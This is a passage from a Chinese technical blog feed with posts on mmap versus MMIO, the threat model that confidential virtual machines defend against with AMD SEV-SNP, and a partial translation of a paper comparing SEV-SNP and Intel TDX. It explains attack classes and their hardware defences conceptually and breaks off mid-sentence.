文件映射"></a>mmap 文件映射</h1><blockquote><p>属于 MMIO 的一种？《UNIX 环境高级编程 p422》</p></blockquote><p><code>mmap</code> 是一个类 UNIX 系统中常见的系统调用接口，用于向进程的地址空间中新增一段虚拟内存段，其声明如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> prot<span class="token punctuation">,</span> <span class="token keyword">int</span> flag<span class="token punctuation">,</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">off_t</span> off<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果指定了 <code>fd</code> 参数（<code>fd</code> 不为 -1），那么 <code>fd</code> 所指向的文件将会从 <code>off</code> 偏移量的位置开始映射一段长度为 <code>len</code> 的数据内容到地址空间中，对文件的读写可以直接转换为对被映射内存地址的读写。当然这个过程通常带有 lazy 的策略，即只有实际读取时才进行加载。示例代码如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>addr <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 直接通过指针读写文件内容</span><span class="token function">memcpy</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="二者的区别和联系"><a href="#二者的区别和联系" class="headerlink" title="二者的区别和联系"></a>二者的区别和联系</h1><p>可以看到，二者在使用上的区别还是很显著的。<code>mmap</code> 操作的是持久化的存储（文件），目的是方便对文件数据的读写；<code>MMIO</code> 操作的是硬件行为，目的是控制设备的状态。</p><p>但是我在阅读《UNIX 环境高级编程：第 3 版》（下面简称 APUE）第 14.8 节——存储映射 I/O 时，其中介绍的内容正是 <code>mmap</code> 接口。实际上，APUE 中所描述的 MMIO，指的应该是 <strong>广义上</strong> 的 MMIO —— 即通过内存地址实现 I/O 操作。将存储在磁盘中的文件映射到地址空间中，其实也是在将磁盘的某些扇区映射到地址空间中，那么对这些地址的写入，最终也会转换为对文件的写入（如果使用 <code>MAP_SHARED</code> 映射类型），对文件的写入，需要通过调用磁盘驱动程序来对更改磁盘上指定的比特位，借此实现持久化，这其实也是在更改设备的状态。从这个角度来看，<code>mmap</code> 文件映射也是 MMIO 的一种。</p><p>最后总结，MMIO 更多是一种理念，是 UNIX 哲学 —— “将复杂操作统一到通用抽象”的延续。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;MMIO 和 mmap 文件映射都涉及将外部资源（除 CPU 寄存器和内存以外）映射到进程的地址空间中，但它们并非等同。本文将对二者进行分别介绍，并对比它们之间的区别和联系。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="虚拟内存" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"/>
    
    <category term="I/O" scheme="http://lordaeronesz.github.io/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>机密虚拟机的威胁模型</title>
    <link href="http://lordaeronesz.github.io/2025/05/06/%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/"/>
    <id>http://lordaeronesz.github.io/2025/05/06/%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/</id>
    <published>2025-05-06T15:30:11.000Z</published>
    <updated>2025-05-22T01:34:51.220Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍近年兴起的机密虚拟机（Confidential Virtual Machine）技术所旨在抵御的威胁模型，主要关注内存机密性（confidentiality）和内存完整性（integrity）两个方面。在解释该威胁可能造成的问题的同时，还将同时介绍现在最主流的机密虚拟机解决方案之一的 AMD SEV-SNP 如何如何应对该威胁。</p><span id="more"></span><p>在正式介绍之前，有必要先明确这样一个概念，在机密虚拟机的威胁模型中，Hypervisor 被认为是不可信的。恶意的 Hypervisor 可能读取虚拟机的内存数据，导致虚拟机用户隐私泄露；或是直接写入虚拟机内存，导致虚拟机运行产生预期之外的结果。</p><h1 id="机密性"><a href="#机密性" class="headerlink" title="机密性"></a>机密性</h1><h2 id="虚拟机内存"><a href="#虚拟机内存" class="headerlink" title="虚拟机内存"></a>虚拟机内存</h2><p>由于虚拟机的内存是通过第二阶段页表映射（GPA -&gt; HPA）到宿主机内存中，且该页表由 Hypervisor 进行维护。因此在未引入机密虚拟机技术时，Hypervisor 能够直接借助该页表映射，手动进行地址转换并读取虚拟机内存数据。</p><p>对于虚拟机内存的机密性，AMD 在最早的 SEV 技术（2016 年）中已经解决。解决方法是为每个虚拟机引入一个 AES 加密密钥，虚拟机指定为私有的页面在被读写时将会自动地进行加解密，这一过程对于虚拟机而言完全无感。当 Hypervisor 尝试读取虚拟机的私有内存数据时，只会读取到被加密过的密文数据，保障了数据的机密性。</p><p><img src="/2025/05/06/%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/threat_1.png" alt></p><h2 id="虚拟机寄存器状态"><a href="#虚拟机寄存器状态" class="headerlink" title="虚拟机寄存器状态"></a>虚拟机寄存器状态</h2><p>虚拟机在 VM Exit 到 Hypervisor 时，需要将此时的 CPU 状态，即寄存器状态进行保存（通常保存在一个数据结构中，AMD-V 虚拟机为 VMCB）。而 Hypervisor 就能在重新 VM Entry 到虚拟机前，很轻松地读取其中的内容。</p><p>AMD 在 2017 年引入了 SEV-ES（Encrypted State）特性，在发生 VM Exit 时，虚拟机寄存器内容会被自动加密，并存入加密的 VMSA（Virtual Machine Save Area）中，原有的 VMCB 的控制字段（非加密）存储着指向 VMSA 的指针。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__packed__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">vmcb_control_area</span> <span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>u64 vmsa_pa<span class="token punctuation">;</span><span class="token comment">/* Used for an SEV-ES guest */</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">vmcb</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">vmcb_control_area</span> control<span class="token punctuation">;</span><span class="token keyword">union</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">vmcb_save_area</span> save<span class="token punctuation">;</span><span class="token comment">/* * For SEV-ES VMs, the save area in the VMCB is used only to * save/load host state.  Guest state resides in a separate * page, the aptly named VM Save Area (VMSA), that is encrypted * with the guest's private key. */</span><span class="token keyword">struct</span> <span class="token class-name">sev_es_save_area</span> host_sev_es_save<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> __packed<span class="token punctuation">;</span></code></pre><h1 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h1><p>内存加密只解决了 Hypervisor 恶意读取虚拟机数据的问题，Hypervisor 仍然可以在不知道数据具体内容的情况下，恶意地对虚拟机内存进行写入，从而破坏虚拟机内存数据，造成预料之外的结果。</p><p>AMD 在 2020 年引入了 SEV-SNP 扩展，引入了对虚拟机完整性保护的支持。核心机制是 <strong>只有内存页面的拥有者才能够写入该页面</strong> 。具体实现方式是引入了新的数据结构 RMP（Reverse Map Table），RMP 是一个在整个系统中共享的单一数据结构，它包含了每个虚拟机可能使用的 HPA 页面的条目。RMP 的作用是为了跟踪每个内存页面的拥有者。</p><blockquote><p>RMP 表不能直接被写入，需要通过 SEV-SNP 引入的新的 CPU 指令来操作。</p></blockquote><p>RMP 检查在虚拟地址通过 Page Walk 得到 HPA 后进行，无论是 Hypervisor 还是虚拟机都需要进行。对于 Hypervisor 而言，它无需进行两阶段地址翻译，因此在完成 <code>VA -&gt; PA</code> 后，查看 PA 对应的 RMP 条目，验证本页面是否属于 Hypervisor；对于虚拟机而言，它在完成 <code>GVA -&gt; GPA -&gt; HPA</code> 后， 查看 HPA 对应的 RMP 条目，检查本次访存是否合法（具体检查内容下文详细讨论）。</p><p><img src="/2025/05/06/%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/threat_2.png" alt></p><h2 id="数据重放（Data-Replay）"><a href="#数据重放（Data-Replay）" class="headerlink" title="数据重放（Data Replay）"></a>数据重放（Data Replay）</h2><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在引入虚拟机内存加密的情况下，虽然无法直接得知从虚拟机中读取到的内存数据的内容，但由于写入操作不受限制，因此恶意的 Hypervisor 可以将从某个内存页处读取到的旧数据保存起来，在未来的某个时刻将这些旧数据进行重放。</p><p>注意，Hypervisor 由于没有被分配 AES 密钥，因此读取到的数据为密文。此时 Hypervisor 不必知道这段密文内容是什么，只需要知道它可能代表了虚拟机某一时刻的状态，Hypervisor 可以在未来的某个时刻将这段密文数据覆写到原来的内存位置，即将虚拟机的某段内存状态进行回退，从而实施可能的攻击。</p><blockquote><p>由于 AES 加密为对称式加密，因此写入经同一个密钥加密的密文数据效果就等同于直接写入明文数据。</p></blockquote><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p><strong>目标：</strong> 只有内存页面的拥有者才能写入页面。</p><p>在 RMP Check 时检查 RMP 条目的 <code>Assigned</code>, <code>ASID</code>, <code>Immutable</code> 字段，验证本次内存写入者是否是页面的拥有者。不同拥有者类型所对应的字段值如下表所示：</p><div class="table-container"><table><thead><tr><th style="text-align:center">Owner</th><th style="text-align:center">Assigned</th><th style="text-align:center">ASID</th><th style="text-align:center">Immutable</th></tr></thead><tbody><tr><td style="text-align:center">Hypervisor</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">-</td></tr><tr><td style="text-align:center">Guest</td><td style="text-align:center">1</td><td style="text-align:center">ASID of the guest</td><td style="text-align:center">-</td></tr><tr><td style="text-align:center">AMD-SP</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr></tbody></table></div><h2 id="数据污染（Data-Corruption）"><a href="#数据污染（Data-Corruption）" class="headerlink" title="数据污染（Data Corruption）"></a>数据污染（Data Corruption）</h2><h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>恶意 Hypervisor 直接将垃圾数据写入虚拟机的内存中，可能造成预期外的行为。</p><h3 id="防御方式-1"><a href="#防御方式-1" class="headerlink" title="防御方式"></a>防御方式</h3><p><strong>目标：</strong> 同数据重放。</p><p>AMD SEV-SNP 实现方式：同数据重放。</p><h2 id="内存混叠（Memory-Aliasing）"><a href="#内存混叠（Memory-Aliasing）" class="headerlink" title="内存混叠（Memory Aliasing）"></a>内存混叠（Memory Aliasing）</h2><h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>恶意 Hypervisor 通过直接写入第二阶段页表，将多个 GPA 映射到同一个 HPA 上。这样的“内存混叠”现象将很容易导致特定物理内存页面的数据被污染，造成预期外的行为。</p><h3 id="防御方式-2"><a href="#防御方式-2" class="headerlink" title="防御方式"></a>防御方式</h3><p><strong>目标：</strong> 每个 host 内存页面在同一时间只能被一个 guest 内存页面映射。</p><p>在 AMD SEV-SNP 中，RMP 条目引入了 <code>Guest_Physical_Address</code> 字段，保存了映射到本页面的 GPA。在执行 RMP 检查时，验证发起本次访存的 GPA 是否等于 <code>Guest_Physical_Address</code>。</p><h2 id="内存重映射（Memory-Re-Mapping）"><a href="#内存重映射（Memory-Re-Mapping）" class="headerlink" title="内存重映射（Memory Re-Mapping）"></a>内存重映射（Memory Re-Mapping）</h2><h3 id="攻击方式-3"><a href="#攻击方式-3" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>恶意 Hypervisor 通过直接写入第二阶段页表，将一个 GPA 映射到多个 HPA，或者更改它所映射的到的 HPA。这将导致虚拟机看到一个不连续的内存视图（an inconsistent view of memory）。下面列举一个可能的场景：</p><ol><li>Hypervisor 将虚拟地址 <code>0x1000</code> 映射到物理页 P1；</li><li>应用程序向 <code>0x1000</code> 写入敏感数据。</li><li>Hypervisor 修改页表，将 <code>0x1000</code> 映射到物理页 P2；</li><li>应用程序再次读取 <code>0x1000</code>，发现数据不见了或变成了其他值；</li><li>程序逻辑因此出错，可能跳过安全检查、泄露信息、甚至崩溃。</li></ol><h3 id="防御方式-3"><a href="#防御方式-3" class="headerlink" title="防御方式"></a>防御方式</h3><p><strong>目标：</strong> 每个 guest 内存页面在同一时间只能映射一个 host 内存页面。</p><p>AMD SEV-SNP 在 RMP 条目中引入 <code>Validated</code> 位，表示本页面是否已经被验证。每个页面被创建时为未验证状态，必须要经过 <code>PVALIDATE</code> 指令验证（验证过程会检测到是否存在一个 guest 页面重复验证的情况）后才能被写入，页面在被指令 <code>RMPUPDATE</code> 更新后又会变成未验证状态，此时需要重新验证。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍近年兴起的机密虚拟机（Confidential Virtual Machine）技术所旨在抵御的威胁模型，主要关注内存机密性（confidentiality）和内存完整性（integrity）两个方面。在解释该威胁可能造成的问题的同时，还将同时介绍现在最主流的机密虚拟机解决方案之一的 AMD SEV-SNP 如何如何应对该威胁。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="机密计算" scheme="http://lordaeronesz.github.io/tags/%E6%9C%BA%E5%AF%86%E8%AE%A1%E7%AE%97/"/>
    
    <category term="虚拟化" scheme="http://lordaeronesz.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>《General overview of AMD SEV-SNP and Intel TDX》中文翻译</title>
    <link href="http://lordaeronesz.github.io/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/"/>
    <id>http://lordaeronesz.github.io/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/</id>
    <published>2025-02-10T15:30:11.000Z</published>
    <updated>2025-02-10T14:17:56.247Z</updated>
    
    <content type="html"><![CDATA[<p>本文为论文《General overview of AMD SEV-SNP and Intel TDX》的中文翻译，翻译工具使用大模型 DeepSeek v3 和通义千问 2.5，经过了本人的核对与校正。由于本人在机密计算领域还处在初学阶段，因此一些专有名词的翻译可能存在问题，欢迎指出。</p><span id="more"></span><div style="text-align: center; font-weight: bold; font-size: 2.0em;">AMD SEV-SNP 和 Intel TDX 的总体概述</div><div style="text-align: center; font-weight: bold; font-size: 1.5em;">作者：<em>Kevin Kollenda</em></div><div style="text-align: left; font-weight: bold; font-size: 1.5em;">摘要</div><p>可信执行环境（TEEs）在安全关键代码的执行上应用越来越普遍。AMD SEV-SNP 和 Intel TDX 是新开发的硬件扩展，旨在为虚拟机提供可信执行的环境。通过提供额外的完整性保证并基于之前的安全扩展，它们使得在云环境中实现不会危及敏感用户数据的机密计算成为可能。本文介绍了用于实现这些重大安全增益的额外组件和流程。</p><div style="text-align: left; font-weight: bold; font-size: 1.5em;">关键词</div><p>可信计算，AMD SEV-SNP，Intel TDX，安全嵌套分页</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>如今，软件公司正越来越多地将其应用程序迁移到云环境中，而不是在本地托管。这可能会对机密用户数据构成风险，因为云服务提供商（CSP）可以直接访问运行潜在安全关键应用程序的硬件。可信执行环境（TEEs）提供了一种安全执行代码的方式，而不会将敏感数据泄露给恶意行为者。此前，TEEs 是通过 Intel SGX 实现的。然而，SGX 的工作原理是将应用程序划分为由安全飞地（enclave）保护的可信部分和正常运行的不可信部分。这降低了开发体验，因为开发人员需要了解安全模型并相应地拆分应用程序，而实现一个安全虚拟机（VM）则无需对应用程序代码进行任何调整。</p><p>为了防止信息泄露并保护机密数据，出现了需要关闭虚拟机（VM）访问权限以阻止虚拟机监控程序（hypervisor）访问的需求。AMD 和 Intel 现在基于他们之前的可信计算 CPU 扩展 AMD SEV-ES 和 Intel SGX 进行迭代，以增强虚拟机的完整性保证并最小化可信计算基（TCB）。云服务用户（CSU）能够安全地依赖在云环境中运行的应用程序，充分利用这些新扩展引入的功能。</p><p>AMD 安全嵌套分页（Secure Nested Paging, SNP） 和 Intel 信任域扩展（Trust Domain Extensions, TDX） 是两种基于硬件的 CPU 扩展，旨在提高虚拟机内存数据的机密性和完整性。它们建立在早期扩展（如 Intel SGX 和 AMD SEV-SEM）的基础上，这些早期扩展无法提供足够的完整性保证。这些保证通过允许虚拟机限制对其内存页的写访问以及对安全关键 CPU 指令（如 <code>CPUID</code>）的输出进行加密验证来实现。此外，虚拟机现在可以信任由安全关键组件报告的固件版本与实际运行的版本一致，这对于防止利用已修复问题的回滚攻击（rollback attacks）至关重要。</p><p>与它们的前身扩展 AMD SEV-ES 和 Intel SGX 类似，AMD SEV-SNP 和 Intel TDX 提供了远程认证（remote attestation）能力。生成的认证报告包括虚拟机的状态以及由虚拟机提供的自定义数据（例如用于验证的公钥），这使得云服务用户（CSUs）能够确认其虚拟机已正确启动并执行。</p><p>虽然 AMD SEV-SNP 自 2021 年 3 月以来已适用于所有 AMD EPYC 7003 系列处理器，但 Intel TDX 目前尚未在任何本世代处理器中提供。Linux 内核对 AMD SEV-SNP 和 Intel TDX 的支持于 2022 年 7 月发布的 5.19 版本中引入，并且由于架构相似性，两者共享了一些新添加的代码。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在本节中，将介绍先前的虚拟机扩展及其功能。此外，由于内存完整性的重要性，还将介绍现代计算机系统中内存访问的过程。</p><h2 id="虚拟机-CPU-扩展的历史"><a href="#虚拟机-CPU-扩展的历史" class="headerlink" title="虚拟机 CPU 扩展的历史"></a>虚拟机 CPU 扩展的历史</h2><p>此前，AMD 和 Intel 开发了多种 CPU 扩展，以支持更可靠且性能更好的虚拟机。其中包括 AMD-V 嵌套分页（Nested Pagint, NP） 和 Intel 扩展页表（Extended Page Table, EPT），它们通过硬件加速的嵌套分页取代了性能较差的基于软件的页虚拟化。</p><p>通过 AMD 安全内存加密（Secure Memory Encryption, SME），为通用计算提供内存加密，以及 AMD 安全加密虚拟化（Secure Encrypted Virtualization, SEV），将 SME 引入由 AMD-V 嵌套分页加速的虚拟机，从而实现了更高的机密性保证。所需的内存加密密钥由集成的低功耗 AMD 安全（协）处理器（AMD SP） 处理，以进一步减少可信组件的数量。目前，Intel 处理器尚未提供硬件辅助的虚拟机内存加密功能，但这将在即将推出的 Intel TDX 扩展中涵盖。虽然 SGX 可以用于虚拟机中以保护虚拟化应用程序（vSGX），但这并不理想，因为一旦为虚拟机启用 SGX，某些虚拟机功能将不可用（例如虚拟机挂起/恢复、快照等）。AMD 还通过引入 AMD SEV-ES（Encrypted State）对其 AMD SEV 扩展进行了迭代，该扩展在虚拟机终止时加密虚拟机的寄存器状态。由于 AMD SEV-ES 已经为虚拟机的寄存器内容提供了完整性保证，因此在 AMD SEV-SNP 中不需要额外的硬件支持来处理虚拟机的状态。</p><p>本世代的处理器会向（恶意的）虚拟机管理器（VMM）提供虚拟机内存的加密内容（通过依赖 SEV），但它们不会阻止对虚拟机内存页的写访问。这使得上述恶意虚拟机监控程序（hypervisor）能够破坏虚拟机的状态，并带来各种重放攻击（replay attacks）的风险。重放攻击是一种攻击向量，恶意行为者在某一时刻获取密文，并在稍后的时间点用这些数据替换未受保护的内存。</p><h2 id="CPU-能力自我报告和安全敏感寄存器"><a href="#CPU-能力自我报告和安全敏感寄存器" class="headerlink" title="CPU 能力自我报告和安全敏感寄存器"></a>CPU 能力自我报告和安全敏感寄存器</h2><p>现代处理器为运行中的系统提供了多种方式来收集有关当前 CPU 的信息。这主要通过调用 <code>CPUID</code> 指令来实现，该指令报告 CPU 可用的硬件扩展、寄存器大小以及其他一些配置细节。虽然虚拟机监控程序（VMM）通常会模拟和调整该指令的输出，以简化虚拟机迁移并限制虚拟机的功能，但这也可能被恶意虚拟机监控程序滥用。尽管此类干扰在大多数情况下只会导致虚拟机的拒绝服务（denial-of-service），但当报告了错误的扩展保存区域（x86 中包含的）值时，也可能导致缓冲区溢出。特定于处理器模型的寄存器（MSR）是处理器使用的各种控制寄存器，用于提供硬件调试功能、性能监控/跟踪数据以及有关可用 CPU 功能的附加信息。虚拟机监控程序可以不受限制地访问这些寄存器，从而可能对虚拟机的执行进行不必要的干预，例如强制调试断点以中断虚拟机的控制流。同样，硬件扩展所使用的 CPU 微代码补丁级别和 CPU 组件的固件版本也可以从软件中查询。如果信任域（TD）不能依赖安全关键硬件组件运行某个预定的版本，就无法保证上述组件中先前已解决的问题和漏洞不会被利用。</p><h2 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h2><p>早期 CPU 扩展（例如 AMD SEV 和 AMD SEV-ES）所依赖的威胁模型包含更多需要信任的组件。这是由于缺乏内存完整性保证，使得恶意实体能够篡改虚拟机的内存。由于 SEV-SNP 和 TDX 防止了这种情况，因此以前被认为可信的组件（例如虚拟机监控程序、具有直接内存访问（DMA）能力的 PCI 设备）现在可以安全地假定为不可信。</p><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>在典型的 x86_64 系统中，内存是通过页（page）来访问的。分页（paging）用于为每个进程模拟一个完整的虚拟地址空间，而不需要在计算机上实际拥有那么多的内存。它通常还用于页级内存保护，为每个进程提供自己的一组页。因此，用户空间进程无法读取或写入属于其他进程或系统内核的页。分页功能由内存管理单元（MMU）处理，它将应用程序使用的虚拟地址转换为硬件可用的实际物理地址。地址通过将其拆分为不同部分来映射到页。通常，最高有效位对应于页目录项（page directory entry），接下来的位表示页表项（page table entry），剩余的位包含页内的偏移量以及由操作系统设置的各种标志（例如读/写/执行启用）。AMD SEV 允许客户虚拟机使用虚拟机特定的加密密钥选择性地保护和加密内存页，从而限制来自外部源（如虚拟机监控程序）的读取访问。Intel SGX 则采用类似的内存加密方式以单个应用程序为单位来进行加密。</p><h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p>SEV-SNP 和 TDX 利用多种硬件技术为虚拟机提供更安全的可信执行环境（TEE）。下文将描述如何实现这一点以及在此过程中涉及哪些组件。</p><h2 id="安全关键组件"><a href="#安全关键组件" class="headerlink" title="安全关键组件"></a>安全关键组件</h2><p>SEV-SNP 和 TDX 所实现的架构改进是通过引入新创建的 CPU 集成组件和模块来实现的。其中 AMD 的 SEV-SNP 实现依赖于 CPU 内置的安全处理器来为虚拟机提供安全环境，而 Intel TDX 使用了一种多组件架构，包括以下部分：</p><ul><li>Intel TDX 模块提供了一种管理 TD 的安全方法，并强制执行各种安全策略。</li><li>Intel 认证代码模块，用于在受保护内存中加载和验证 TDX 模块。</li><li>使用 Intel SGX 创建的 TD Quoting enclave（TDQE）用于远程证明。</li></ul><p>这些组件提供了虚拟机监控程序（hypervisor）创建和配置虚拟机所需的管理接口，并负责拦截针对受 SEV-SNP 或 TDX 保护的虚拟机的任何攻击。与 AMD 的安全处理器（SP）的通信通过一种新的虚拟机管理 API 接口实现，而 Intel 则依赖于额外的 CPU 指令。由于这些组件的数据结构具有安全关键性，外部参与者（例如系统上运行的软件或支持 DMA 的设备）无法访问这些数据结构。这些数据结构包含 CPU 集成安全模块所需的管理信息。例如，SEV-SNP 提供的加密虚拟机保存区域（Virtual Machine Save Area, VMSA），或由使用 TDX 的虚拟机监控程序为每个信任域（TD）发布的虚拟机控制结构（Virtual Machine Control Structure, VMCS）。</p><h2 id="内存完整性保护"><a href="#内存完整性保护" class="headerlink" title="内存完整性保护"></a>内存完整性保护</h2><p>内存完整性保护是 AMD SEV-SNP 和 Intel TDX 引入的主要改进之一。SEV-SNP 和 TDX 都建立了共享（未加密）和私有（加密）内存页之间的分离。一个页是共享还是私有由虚拟地址的最高有效位指示，并在页表遍历（page table walk）中进行验证。共享页仍然可以使用虚拟机监控程序对应的密钥进行加密，但从虚拟机的角度来看，应将其视为不可信。私有（客户）页始终使用虚拟机特定的密钥进行加密，使得外部观察者无法读取内存内容。</p><h3 id="AMD-SEV-SNP"><a href="#AMD-SEV-SNP" class="headerlink" title="AMD SEV-SNP"></a>AMD SEV-SNP</h3><p>AMD SEV-SNP 实现内存完整性改进的核心原则是确保分配了私有内存页的虚拟机始终能够读取它写入这些页的最后一个内存值。SEV-SNP 不仅为常规的内存读写保证了这种行为，还确保了在内存页被交换到持久存储或整个虚拟机迁移到另一台主机时也能保持这种一致性。因此，依赖于用先前读取的密文替换虚拟机内存的重放攻击，以及通过向内存页写入无关数据来破坏虚拟机内存的拒绝服务攻击，都不再可能实现。</p><p>这是通过添加一个在系统范围内共享的反向映射表（Reverse Map Table, RMP）数据结构来实现的，该表跟踪可以分配给虚拟机的每个页的所有者。对于启用了 SNP 的虚拟机所拥有页的 RMP 条目，它还保存了该页应映射到的客户物理地址（gPA）。此外，每个 RMP 条目包含一个验证位，该位在为虚拟机创建页之前被清零。每当对 SNP-VM 的页执行内存写访问时（无论是虚拟机监控程序还是虚拟机本身），都会执行 RMP 检查，以确保只有拥有该页的实体才能修改它。来自外部参与者（例如虚拟机监控程序或其他客户）的内存读取访问不需要使用 RMP 进行验证，因为私有页的内存始终使用虚拟机的特定私钥进行加密。</p><p>只要访问的页不属于启用了 SEV-SNP 的客户虚拟机，虚拟机监控程序的页表遍历就不会受到 RMP 的影响。如果恶意虚拟机监控程序试图覆盖此类页的内存内容，页表遍历将导致页错误（#PF），并且目标页不会受到影响。RMP 检查在常规页表遍历结束时执行，其条目使用系统的物理地址进行索引。修改后的页表遍历与图 1 中的相同，但由于没有客户虚拟机参与，因此不需要第一阶段页转换。</p><p><img src="/2025/02/10/%E3%80%8AGeneral%20overview%20of%20AMD%20SEV-SNP%20and%20Intel%20TDX%E3%80%8B%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91/f1.png" alt></p><p>对于启用了 SEV-SNP 的虚拟机，页表遍历更加复杂。使用 AMD-V 提供的加速嵌套页表遍历，首先完成客户虚拟地址（gVA）到客户物理地址（gPA），再到主机系统物理地址（sPA）的初始地址转换。随后调用 RMP 检查，验证该页是否：</p><ul><li>属于虚拟机而非虚拟机监控程序。</li><li>由发起页表遍历的特定客户虚拟机拥有。</li><li>映射到正确的客户物理地址（gPA）。</li></ul><p>这种带有额外嵌套页表遍历的修改版页表遍历如图 1 所示。有关页表状态的更多信息，请参阅附录部分 A。</p><p>如果客户虚拟机正确验证了其私有页，这些内存完整性保证可以防止页重映射攻击。为了确保这些完整性违规行为不可能发生并被 RMP 检查捕获，客户虚拟机必须确保每个客户物理地址（gPA）仅被验证一次。要实现这一点，可以通过在虚拟机启动时执行所有页验证，或者由客户虚拟机跟踪所有先前验证过的 gPA。如果 gPA 和系统物理地址（sPA）之间的单射属性成立，任何由受感染的（恶意的）虚拟机监控程序发起的恶意嵌套页表更改都会导致客户虚拟机在尝试访问重映射的 gPA 时收到虚拟机通信（#VC）异常（因为 <code>RMPUPDATE</code> 会清除验证位）。客户虚拟机应非常谨慎地处理 #VC 异常，因为这是攻击发生的迹象。通常，客户虚拟机会尝试执行任何必要的步骤以保护自己免受恶意虚拟机监控程序的侵害，或者完全终止。</p><h3 id="Intel-TDX"><a href="#Intel-TDX" class="headerlink" title="Intel TDX"></a>Intel TDX</h3><p>Intel TDX 提供了与 AMD SEV-SNP 类似的内存完整性功能。CPU 内置的 TDX 模块为虚拟机监控程序提供了一个间接管理虚拟机的接口，并提供了新的指令 <code>VMLAUNCH-VMX</code> 和 <code>VMRESUME</code> 用于启动和恢复虚拟机。与在系统范围内跟踪每个内存页的所有者不同，TDX 依赖于为虚拟机监控程序维护一个共享的扩展页表（EPT），并为每个虚拟机（Intel 称之为 TD）维护多个私有的扩展页表。由于这些固有的架构差异，从 TD 内部发起的页表遍历（PTW）与 